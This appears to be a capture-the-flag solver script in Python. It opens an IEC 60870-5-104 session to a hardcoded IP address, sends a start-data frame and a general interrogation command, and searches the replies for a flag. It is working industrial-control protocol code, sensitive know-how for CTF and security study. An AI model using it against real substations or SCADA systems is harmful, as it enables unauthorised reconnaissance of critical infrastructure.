#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(120)
    try:
        s.connect((HOST, PORT))
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex() if r else 'none')
        tx = [0]; rx = [0]
        def send_i(asdu):
            apci = bytes([0x68, len(asdu)+4, tx[0]&0xFF,(tx[0]>>8)&0xFF, rx[0]&0xFF,(rx[0]>>8)&0xFF])
            tx[0] += 2; rx[0] += 2
            s.send(apci+asdu)
        # GI
        asdu = bytes([100, 0x01, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x14])
        send_i(asdu)
        time.sleep(10)
        all_data = b''
        while True:
            try:
                s.settimeout(5)
                r = s.recv(4096)
                if not r: break
                all_data += r
                print('RCV:', r.hex())
            except: break
        print('TOTAL:', all_data.hex())
        if b'CTF{' in all_data:
            print(all_data)
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
